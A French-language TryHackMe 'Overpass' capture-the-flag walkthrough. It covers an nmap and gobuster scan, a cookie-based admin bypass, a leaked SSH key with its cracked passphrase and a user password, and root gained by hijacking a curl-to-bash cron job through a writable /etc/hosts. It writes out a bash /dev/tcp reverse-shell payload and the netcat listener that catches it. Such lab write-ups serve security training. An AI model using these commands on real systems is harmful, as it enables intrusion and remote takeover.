#TryHackMe #linux 
# Scan Nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
|_http-title: Overpass

# Gobuster Enum
 ===============================================================
	/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
	/admin                (Status: 301) [Size: 42] [--> /admin/]
	/css                  (Status: 301) [Size: 0] [--> css/]
	/downloads            (Status: 301) [Size: 0] [--> downloads/]
	/img                  (Status: 301) [Size: 0] [--> img/]
	/index.html           (Status: 301) [Size: 0] [--> ./]
===============================================

# Find
## Potential usernames on aboutus page
Ninja
Pars
Szymex
Bee
MuirlandOracle
## login.js

 else {
    Cookies.set("SessionToken",statusOrCookie)
    window.location = "/admin"
    }
# Ajouter Cookie 
name=SessionToken 
value = 0

# Clé SSH obtenu
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----

# Admin name = james

# Exploitation 
Crack ssh key
#crackPass
parphrase = james13
Connection ssh to james

# FootHold
## Find
file : .overpass (contient le mot de passe crypté en rot47 de james)
james password = saydrawnlyingpicture
Transfer linpeas to remote server by wget and create a python server

james@overpass-prod:~$ cat todo.txt 
	To Do:
> 	Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> 	Write down my password somewhere on a sticky note so that I don't forget it.
	  Wait, we make a password manager. Why don't I just use that?
> 	Test Overpass for macOS, it builds fine but I'm not sure it actually works
> 	Ask Paradox how he got the automated build script working and where the builds go.
	  They're not updating on the website

L'avant dernière ligne nous informe qu'il y a un script qui s'exécute automatiquement.
Les scripts qui sont lancés automatiquement par intervale de temps sont enrégistrés dans le repertoire /etc/crontab.
Vérifions : 
james@overpass-prod:~$ cat /etc/crontab
	.....SIP......
	# Update builds from latest code
	* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

On constate que le derniner commentaire indique que la ligne en desous effectue une mise à jour automatique de OverPass toutes les minutes. Très interessant !
En examinant la ligne de code on constate que l'utilisateur `root` récupère et exécute le fichier `buildscript.sh` sur un serveur distant dont l'adresse est `overpass.thm`. Très interessant !
Ici l'idéale est de pouvoir modifier l'adresse ip atribuée au serveur par notre adresse local pour ainsi obtenir un revershell.

## On vérifie si on a le droit d'écriture sur des fichiers
On envoie et on lance de linpeas.sh sur la cible.
On constate qu'on a le droit d'écriture sur `/etc/hosts`    (**Bingo !**)
On pourais aussi vérifier cela en vérifiant juste les droits sur /etc/hosts avec la commande **ls -l /etc/hosts**
On modifie comme prévu.
Apartir de là on peut obtenir un revershell

# PrivEsc
## Création du fichier buildscript.sh pour le revershell sur attackbox
┌──(root㉿kali)-[/home/kali/Desktop/THM/OverPass]
└─# mkdir downloads  
┌──(root㉿kali)-[/home/kali/Desktop/THM/OverPass]
└─# mkdir downloads/src
┌──(root㉿kali)-[/home/kali/Desktop/THM/OverPass]
└─# touch downloads/src/buildscript.sh
┌──(root㉿kali)-[/home/kali/Desktop/THM/OverPass]
└─# echo "bash -c 'bash -i >& /dev/tcp/@iplocal/12345 0>&1'"  > downloads/src/buildscript.sh

## Création du serveur python
┌──(root㉿kali)-[/home/kali/Desktop/THM/OverPass]
└─# python3 -m http.server 80 
## Ecoute du port 12345
┌──(root㉿kali)-[~]
└─# nc -lvnp 1234
listening on [any] 1234 ...

# ReverShell obtenu Machine rooter
┌──(root㉿kali)-[~]
└─# nc -lvnp 12345
listening on [any] 12345 ...
connect to [@iplocal] from (UNKNOWN) [10.10.188.40] 36762
bash: cannot set terminal process group (16977): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~#

